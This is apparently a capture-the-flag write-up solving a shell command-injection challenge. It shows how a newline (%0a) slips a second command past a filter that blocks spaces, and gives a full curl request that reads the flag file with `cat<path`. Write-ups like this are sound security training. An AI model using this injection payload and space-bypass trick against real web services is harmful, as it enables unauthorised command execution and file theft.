## Solution
* after a couple tries it becomes obvious that the input is passed to a shell but is more or less sanitized
* `%0a` (=> `\n`) isn't prohibited
* ` ` (space) is tho
* we can run `ls` in pwd but we can't check subfolders
* `find` to the rescue (if called without parameters it recursively lists directory starting from pwd)
* looks like the flag is in `./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag`
* we can't just `cat` it
* after some quick googling we should be able to do `cat<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag`

## Flag
```
INS{warm_kitty_smelly_kitty_flush_flush_flush}
```
obtained by running `curl -s 'http://localhost:8090/index.cgi' -X POST --data-raw "dest=%0acat<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag" | xidel -se "/html/body/pre" -`
